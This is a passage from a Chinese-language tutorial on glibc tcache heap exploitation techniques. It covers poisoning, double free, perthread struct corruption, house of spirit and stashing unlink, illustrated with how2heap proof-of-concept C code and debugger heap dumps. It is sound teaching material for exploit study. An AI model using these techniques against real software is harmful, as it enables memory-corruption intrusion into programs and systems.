class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>输入如下：</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">glibc_2.26 [master●] ./tcache_poisoning </span><br><span class="line">This file demonstrates a<span class="built_in"> simple </span>tcache poisoning attack by tricking malloc into</span><br><span class="line">returning a pointer <span class="keyword">to</span> an arbitrary location (<span class="keyword">in</span> this case, the stack).</span><br><span class="line">The attack is very similar <span class="keyword">to</span> fastbin corruption attack.</span><br><span class="line"></span><br><span class="line">The<span class="built_in"> address </span>we want malloc() <span class="keyword">to</span> return is 0x7fff0d28a0c8.</span><br><span class="line">Allocating 1 buffer.</span><br><span class="line">malloc(128): 0x55f666ee1260</span><br><span class="line">Freeing the buffer<span class="built_in">..</span>.</span><br><span class="line">Now the tcache list has [ 0x55f666ee1260 ].</span><br><span class="line">We overwrite the first 8 bytes (fd/next pointer) of the data at 0x55f666ee1260</span><br><span class="line"><span class="keyword">to</span> point <span class="keyword">to</span> the location <span class="keyword">to</span> control (0x7fff0d28a0c8).</span><br><span class="line">1st malloc(128): 0x55f666ee1260</span><br><span class="line">Now the tcache list has [ 0x7fff0d28a0c8 ].</span><br><span class="line">2st malloc(128): 0x7fff0d28a0c8</span><br><span class="line">We got the control</span><br></pre></td></tr></table></figure>

<p>从代码的逻辑可以看出其漏洞利用与 fastbin 的攻击方式是一样的，都是通过更改<code>fd</code>指针指向我们控制的地址，但因为没有 size 的限制有了更大的利用范围。</p>
<h4 id="tcache-dup"><a href="#tcache-dup" class="headerlink" title="tcache dup"></a>tcache dup</h4><p>类似 <code>fastbin dup</code>，不过利用的是 <code>tcache_put()</code> 的不严谨：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> __always_inline <span class="keyword">void</span></span><br><span class="line">tcache_put (mchunkptr chunk, <span class="keyword">size_t</span> tc_idx)</span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);</span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line">  e-&gt;next = tcache-&gt;entries[tc_idx];</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e;</span><br><span class="line">  ++(tcache-&gt;counts[tc_idx]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看出，<code>tcache_put()</code> 的检查也可以忽略不计（甚至没有对 <code>tcache-&gt;counts[tc_idx]</code> 的检查），大幅提高性能的同时安全性也下降了很多。</p>
<p>因为没有任何检查，所以我们可以对同一个 chunk 多次 free，造成 cycliced list。</p>
<p>以 how2heap 中的 <a href="https://github.com/shellphish/how2heap/blob/master/glibc_2.26/tcache_poisoning.c">tcache_dup</a> 为例，代码如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"This file demonstrates a simple double-free attack with tcache.\n"</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Allocating buffer.\n"</span>);</span><br><span class="line">	<span class="keyword">int</span> *a = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"malloc(8): %p\n"</span>, a);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Freeing twice...\n"</span>);</span><br><span class="line">	<span class="built_in">free</span>(a);</span><br><span class="line">	<span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now the free list has [ %p, %p ].\n"</span>, a, a);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Next allocated buffers will be same: [ %p, %p ].\n"</span>, <span class="built_in">malloc</span>(<span class="number">8</span>), <span class="built_in">malloc</span>(<span class="number">8</span>));</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>第一次 free 时，申请的 chunk 被放入 tcache_entry 中：</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; heapinfo</span><br><span class="line"><span class="number">3886144</span></span><br><span class="line">(<span class="number">0x20</span>)     fastbin[<span class="number">0</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x30</span>)     fastbin[<span class="number">1</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x40</span>)     fastbin[<span class="number">2</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x50</span>)     fastbin[<span class="number">3</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x60</span>)     fastbin[<span class="number">4</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x70</span>)     fastbin[<span class="number">5</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x80</span>)     fastbin[<span class="number">6</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x90</span>)     fastbin[<span class="number">7</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0xa0</span>)     fastbin[<span class="number">8</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0xb0</span>)     fastbin[<span class="number">9</span>]: <span class="number">0x0</span></span><br><span class="line">                  top: <span class="number">0x555555756270</span> (size : <span class="number">0x20d90</span>) </span><br><span class="line">       last_remainder: <span class="number">0x0</span> (size : <span class="number">0x0</span>) </span><br><span class="line">            unsortbin: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x20</span>)   tcache_entry[<span class="number">0</span>]: <span class="number">0x555555756260</span></span><br></pre></td></tr></table></figure>

<p>第二次 free 时，虽然 free 的是同一个 chunk，但因为 <code>tcache_put()</code> 没有做任何检查，因此程序不会 crash，而 tcache_entry 中会再添加该 chunk 的地址：</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; heapinfo</span><br><span class="line"><span class="number">3886144</span></span><br><span class="line">(<span class="number">0x20</span>)     fastbin[<span class="number">0</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x30</span>)     fastbin[<span class="number">1</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x40</span>)     fastbin[<span class="number">2</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x50</span>)     fastbin[<span class="number">3</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x60</span>)     fastbin[<span class="number">4</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x70</span>)     fastbin[<span class="number">5</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x80</span>)     fastbin[<span class="number">6</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x90</span>)     fastbin[<span class="number">7</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0xa0</span>)     fastbin[<span class="number">8</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0xb0</span>)     fastbin[<span class="number">9</span>]: <span class="number">0x0</span></span><br><span class="line">                  top: <span class="number">0x555555756270</span> (size : <span class="number">0x20d90</span>) </span><br><span class="line">       last_remainder: <span class="number">0x0</span> (size : <span class="number">0x0</span>) </span><br><span class="line">            unsortbin: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x20</span>)   tcache_entry[<span class="number">0</span>]: <span class="number">0x555555756260</span> --&gt; <span class="number">0x555555756260</span> (overlap chunk with <span class="number">0x555555756250</span>(freed) )</span><br></pre></td></tr></table></figure>

<h4 id="tcache-perthread-corruption"><a href="#tcache-perthread-corruption" class="headerlink" title="tcache perthread corruption"></a>tcache perthread corruption</h4><p>我们已经知道 <code>tcache_perthread_struct</code> 是整个 tcache 的管理结构，如果能控制这个结构体，那么无论我们 malloc 的 size 是多少，地址都是可控的。</p>
<p>设想有如下的堆排布情况：</p>
<figure class="highlight gherkin"><table><tr><td class="code"><pre><span class="line">tcache_    +------------+</span><br><span class="line">\perthread |<span class="string">......      </span>|</span><br><span class="line">\_struct   +------------+</span><br><span class="line">           |<span class="string">counts[i]   </span>|</span><br><span class="line">           +------------+</span><br><span class="line">           |<span class="string">......      </span>|<span class="string">          +----------+</span></span><br><span class="line"><span class="string">           +------------+          </span>|<span class="string">header    </span>|</span><br><span class="line">           |<span class="string">entries[i]  </span>|<span class="string">---------&gt;+----------+</span></span><br><span class="line"><span class="string">           +------------+          </span>|<span class="string">NULL      </span>|</span><br><span class="line">           |<span class="string">......      </span>|<span class="string">          +----------+</span></span><br><span class="line"><span class="string">           </span>|<span class="string">            </span>|<span class="string">          </span>|<span class="string">          </span>|</span><br><span class="line">           +------------+          +----------+</span><br></pre></td></tr></table></figure>

<p>通过一些手段（如 <code>tcache posioning</code>），我们将其改为了：</p>
<figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line">tcache_    +<span class="params">------------</span>+&lt;<span class="params">---------------------------</span>+</span><br><span class="line">\perthread |<span class="string">......</span>      |                            |</span><br><span class="line">\_struct   +<span class="params">------------</span>+                            |</span><br><span class="line">           |counts[i]   |                            |</span><br><span class="line">           +<span class="params">------------</span>+                            |</span><br><span class="line">           |<span class="string">......</span>      |          +<span class="params">----------</span>+      |</span><br><span class="line">           +<span class="params">------------</span>+          |header    |      |</span><br><span class="line">           |entries[i]  |<span class="params">---------</span>&gt;+<span class="params">----------</span>+      |</span><br><span class="line">           +<span class="params">------------</span>+          |target    |<span class="params">------</span>+</span><br><span class="line">           |<span class="string">......</span>      |          +<span class="params">----------</span>+</span><br><span class="line">           |            |          |          |</span><br><span class="line">           +<span class="params">------------</span>+          +<span class="params">----------</span>+</span><br></pre></td></tr></table></figure>

<p>这样，两次 malloc 后我们就返回了 <code>tcache_prethread_struct</code> 的地址，就可以控制整个 tcache 了。因为 tcache_prethread_struct 也在堆上，因此这种方法一般只需要 partial overwrite 就可以达到目的。</p>
<h4 id="tcache-house-of-spirit"><a href="#tcache-house-of-spirit" class="headerlink" title="tcache house of spirit"></a>tcache house of spirit</h4><p>与 fastbin 中的 house of spirit 一样，该技术的核心在于在目标位置处伪造 fastbin chunk，并将其释放，从而达到分配<strong>指定地址</strong>的 chunk 的目的。</p>
<p>拿 how2heap 的源码来讲：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"This file demonstrates the house of spirit attack on tcache.\n"</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"It works in a similar way to original house of spirit but you don't need to create fake chunk after the fake chunk that will be freed.\n"</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"You can see this in malloc.c in function _int_free that tcache_put is called without checking if next chunk's size and prev_inuse are sane.\n"</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"(Search for strings \"invalid next size\" and \"double free or corruption\")\n\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Ok. Let's start with the example!.\n\n"</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Calling malloc() once so that it sets up its memory.\n"</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Let's imagine we will overwrite 1 pointer to point to a fake chunk region.\n"</span>);</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *a; <span class="comment">//pointer that will be overwritten</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> fake_chunks[<span class="number">10</span>]; <span class="comment">//fake chunk region</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"This region contains one fake chunk. It's size field is placed at %p\n"</span>, &amp;fake_chunks[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"This chunk size has to be falling into the tcache category (chunk.size &lt;= 0x410; malloc arg &lt;= 0x408 on x64). The PREV_INUSE (lsb) bit is ignored by free for tcache chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.\n"</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end. \n"</span>);</span><br><span class="line">    fake_chunks[<span class="number">1</span>] = <span class="number">0x40</span>; <span class="comment">// this is the size</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, %p.\n"</span>, &amp;fake_chunks[<span class="number">1</span>]);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.\n"</span>);</span><br><span class="line"></span><br><span class="line">    a = &amp;fake_chunks[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Freeing the overwritten pointer.\n"</span>);</span><br><span class="line">    <span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now the next malloc will return the region of our fake chunk at %p, which will be %p!\n"</span>, &amp;fake_chunks[<span class="number">1</span>], &amp;fake_chunks[<span class="number">2</span>]);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"malloc(0x30): %p\n"</span>, <span class="built_in">malloc</span>(<span class="number">0x30</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>攻击之后的目的是，去控制栈上的内容，malloc 一块 chunk ，然后我们通过在栈上 fake 的 chunk，然后去 free 掉他，我们会发现：</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">gdb-peda$ heapinfo</span><br><span class="line">(<span class="number">0x20</span>)     fastbin[<span class="number">0</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x30</span>)     fastbin[<span class="number">1</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x40</span>)     fastbin[<span class="number">2</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x50</span>)     fastbin[<span class="number">3</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x60</span>)     fastbin[<span class="number">4</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x70</span>)     fastbin[<span class="number">5</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x80</span>)     fastbin[<span class="number">6</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x90</span>)     fastbin[<span class="number">7</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0xa0</span>)     fastbin[<span class="number">8</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0xb0</span>)     fastbin[<span class="number">9</span>]: <span class="number">0x0</span></span><br><span class="line">                  top: <span class="number">0x4052e0</span> (size : <span class="number">0x20d20</span>)</span><br><span class="line">       last_remainder: <span class="number">0x0</span> (size : <span class="number">0x0</span>)</span><br><span class="line">            unsortbin: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x90</span>)   tcache_entry[<span class="number">7</span>]: <span class="number">0x7fffffffe510</span> --&gt; <span class="number">0x401340</span></span><br></pre></td></tr></table></figure>

<p>Tcache 里就存放了一块 栈上的内容，我们之后只需 malloc，就可以控制这块内存。</p>
<h4 id="smallbin-unlink"><a href="#smallbin-unlink" class="headerlink" title="smallbin unlink"></a>smallbin unlink</h4><p>在 smallbin 中包含有空闲块的时候，会同时将同大小的其他空闲块，放入 tcache 中，此时也会出现解链操作，但相比于 unlink 宏，缺少了链完整性校验。因此，原本 unlink 操作在该条件下也可以使用。</p>
<h4 id="tcache-stashing-unlink-attack"><a href="#tcache-stashing-unlink-attack" class="headerlink" title="tcache stashing unlink attack"></a>tcache stashing unlink attack</h4><p>这种攻击利用的是 tcache bin 有剩余 (数量小于 <code>TCACHE_MAX_BINS</code> ) 时，同大小的 small bin 会放进 tcache 中 (这种情况可以用 <code>calloc</code> 分配同大小堆块触发，因为 <code>calloc</code> 分配堆块时不从 tcache bin 中选取)。在获取到一个 <code>smallbin</code> 中的一个 chunk 后会如果 tcache 仍有足够空闲位置，会将剩余的 small bin 链入 tcache ，在这个过程中只对第一个 bin 进行了完整性检查，后面的堆块的检查缺失。当攻击者可以写一个 small bin 的 bk 指针时，其可以在任意地址上写一个 libc 地址 (类似 <code>unsorted bin attack</code> 的效果)。构造得当的情况下也可以分配 fake chunk 到任意地址。</p>
<p>我们按照释放的先后顺序称 <code>smallbin[sz]</code> 中的两个 chunk 分别为 chunk0 和 chunk1。我们修改 chunk1 的 <code>bk</code> 为 <code>fake_chunk_addr</code>。同时还要在 <code>fake_chunk_addr-&gt;bk</code> 处提前写一个可写地址 <code>writable_addr</code> 。调用 <code>calloc(size-0x10)</code> 的时候会返回给用户 chunk0 (这是因为 smallbin 的 <code>FIFO</code> 分配机制)，假设 <code>tcache[sz]</code> 中有 5 个空闲堆块，则有足够的位置容纳 <code>chunk1</code> 以及 <code>fake_chunk</code> 。在源码的检查中，只对第一个 chunk 的链表完整性做了检测 <code>__glibc_unlikely (bck-&gt;fd != victim)</code> ，后续堆块在放入过程中并没有检测。</p>
<p>因为 tcache 的分配机制是 <code>LIFO</code> ，所以位于 <code>fake_chunk-&gt;bk</code> 指针处的 <code>fake_chunk</code> 在链入 tcache 的时候反而会放到链表表头。在下一次调用 <code>malloc(sz-0x10)</code> 时会返回 <code>fake_chunk+0x10</code> 给用户，同时，由于 <code>bin-&gt;bk = bck;bck-&gt;fd = bin;</code> 的 unlink 操作，会使得 <code>writable_addr+0x10</code> 处被写入一个 libc 地址。</p>
<p>这里以 <code>how2heap</code> 中的 <code>tcache_stashing_unlink_attack</code> 为例：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> stack_var[<span class="number">0x10</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> *chunk_lis[<span class="number">0x10</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> *target;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"This file demonstrates the stashing unlink attack on tcache.\n\n"</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"This poc has been tested on both glibc 2.27 and glibc 2.29.\n\n"</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"This technique can be used when you are able to overwrite the victim-&gt;bk pointer. Besides, it's necessary to alloc a chunk with calloc at least once. Last not least, we need a writable address to bypass check in glibc\n\n"</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"The mechanism of putting smallbin into tcache in glibc gives us a chance to launch the attack.\n\n"</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"This technique allows us to write a libc addr to wherever we want and create a fake chunk wherever we need. In this case we'll create the chunk on the stack.\n\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// stack_var emulate the fake_chunk we want to alloc to</span></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Stack_var emulates the fake chunk we want to alloc to.\n\n"</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"First let's write a writeable address to fake_chunk-&gt;bk to bypass bck-&gt;fd = bin in glibc. Here we choose the address of stack_var[2] as the fake bk. Later we can see *(fake_chunk-&gt;bk + 0x10) which is stack_var[4] will be a libc addr after attack.\n\n"</span>);</span><br><span class="line"></span><br><span class="line">    stack_var[<span class="number">3</span>] = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(&amp;stack_var[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"You can see the value of fake_chunk-&gt;bk is:%p\n\n"</span>,(<span class="keyword">void</span>*)stack_var[<span class="number">3</span>]);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Also, let's see the initial value of stack_var[4]:%p\n\n"</span>,(<span class="keyword">void</span>*)stack_var[<span class="number">4</span>]);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now we alloc 9 chunks with malloc.\n\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//now we malloc 9 chunks</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; <span class="number">9</span>;i++)&#123;</span><br><span class="line">        chunk_lis[i] = (<span class="keyword">unsigned</span> <span class="keyword">long</span>*)<span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//put 7 tcache</span></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Then we free 7 of them in order to put them into tcache. Carefully we didn't free a serial of chunks like chunk2 to chunk9, because an unsorted bin next to another will be merged into one after another malloc.\n\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">3</span>;i &lt; <span class="number">9</span>;i++)&#123;</span><br><span class="line">        <span class="built_in">free</span>(chunk_lis[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"As you can see, chunk1 &amp; [chunk3,chunk8] are put into tcache bins while chunk0 and chunk2 will be put into unsorted bin.\n\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//last tcache bin</span></span><br><span class="line">    <span class="built_in">free</span>(chunk_lis[<span class="number">1</span>]);</span><br><span class="line">    <span class="comment">//now they are put into unsorted bin</span></span><br><span class="line">    <span class="built_in">free</span>(chunk_lis[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">free</span>(chunk_lis[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//convert into small bin</span></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now we alloc a chunk larger than 0x90 to put chunk0 and chunk2 into small bin.\n\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0xa0</span>);<span class="comment">//&gt;0x90</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//now 5 tcache bins</span></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Then we malloc two chunks to spare space for small bins. After that, we now have 5 tcache bins and 2 small bins\n\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now we emulate a vulnerability that can overwrite the victim-&gt;bk pointer into fake_chunk addr: %p.\n\n"</span>,(<span class="keyword">void</span>*)stack_var);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//change victim-&gt;bck</span></span><br><span class="line">    <span class="comment">/*VULNERABILITY*/</span></span><br><span class="line">    chunk_lis[<span class="number">2</span>][<span class="number">1</span>] = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)stack_var;</span><br><span class="line">    <span class="comment">/*VULNERABILITY*/</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//trigger the attack</span></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Finally we alloc a 0x90 chunk with calloc to trigger the attack. The small bin preiously freed will be returned to user, the other one and the fake_chunk were linked into tcache bins.\n\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">calloc</span>(<span class="number">1</span>,<span class="number">0x90</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now our fake chunk has been put into tcache bin[0xa0] list. Its fd pointer now point to next free chunk: %p and the bck-&gt;fd has been changed into a libc addr: %p\n\n"</span>,(<span class="keyword">void</span>*)stack_var[<span class="number">2</span>],(<span class="keyword">void</span>*)stack_var[<span class="number">4</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//malloc and return our fake chunk on stack</span></span><br><span class="line">    target = <span class="built_in">malloc</span>(<span class="number">0x90</span>);   </span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"As you can see, next malloc(0x90) will return the region our fake chunk: %p\n"</span>,(<span class="keyword">void</span>*)target);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个 poc 用栈上的一个数组上模拟 <code>fake_chunk</code> 。首先构造出 5 个 <code>tcache chunk</code> 和 2 个 <code>smallbin chunk</code> 的情况。模拟 <code>UAF</code> 漏洞修改 <code>bin2-&gt;bk</code> 为 <code>fake_chunk</code> ，在 <code>calloc(0x90)</code> 的时候触发攻击。</p>
<p>我们在 <code>calloc</code> 处下断点，调用前查看堆块排布情况。此时 <code>tcache[0xa0]</code> 中有 5 个空闲块。可以看到 chunk1-&gt;bk 已经被改为了 <code>fake_chunk_addr</code> 。而 <code>fake_chunk-&gt;bk</code> 也写上了一个可写地址。由于 <code>smallbin</code> 是按照 <code>bk</code> 指针寻块的，分配得到的顺序应当是 <code>0x0000000000603250-&gt;0x0000000000603390-&gt;0x00007fffffffdbc0 (FIFO)</code> 。调用 calloc 会返回给用户 <code>0x0000000000603250+0x10</code>。</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">gdb-peda$ heapinfo</span><br><span class="line">(<span class="number">0x20</span>)     fastbin[<span class="number">0</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x30</span>)     fastbin[<span class="number">1</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x40</span>)     fastbin[<span class="number">2</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x50</span>)     fastbin[<span class="number">3</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x60</span>)     fastbin[<span class="number">4</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x70</span>)     fastbin[<span class="number">5</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x80</span>)     fastbin[<span class="number">6</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x90</span>)     fastbin[<span class="number">7</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0xa0</span>)     fastbin[<span class="number">8</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0xb0</span>)     fastbin[<span class="number">9</span>]: <span class="number">0x0</span></span><br><span class="line">                  top: <span class="number">0x6038a0</span> (size : <span class="number">0x20760</span>) </span><br><span class="line">       last_remainder: <span class="number">0x0</span> (size : <span class="number">0x0</span>) </span><br><span class="line">            unsortbin: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x0a0</span>)  smallbin[ <span class="number">8</span>]: <span class="number">0x603390</span> (doubly linked list corruption <span class="number">0x603390</span> != <span class="number">0x0</span> <span class="keyword">and</span> <span class="number">0x603390</span> <span class="keyword">is</span> broken)</span><br><span class="line">(<span class="number">0xa0</span>)   tcache_entry[<span class="number">8</span>](<span class="number">5</span>): <span class="number">0x6036c0</span> --&gt; <span class="number">0x603620</span> --&gt; <span class="number">0x603580</span> 